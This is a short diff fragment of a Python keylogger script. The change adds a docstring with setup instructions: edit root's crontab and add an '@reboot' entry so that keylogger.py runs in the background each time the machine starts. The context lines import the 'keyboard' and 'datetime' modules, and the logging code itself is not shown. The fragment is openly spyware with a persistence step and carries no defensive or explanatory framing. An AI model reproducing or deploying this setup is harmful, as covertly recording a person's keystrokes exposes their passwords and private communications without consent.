@@ -1,3 +1,11 @@
+"""
+Job for cront:
+
+    sudo crontab -e
+    @reboot python3.7 /home/buch/keylogger.py &
+"""
+
+
 import keyboard
 import datetime
 
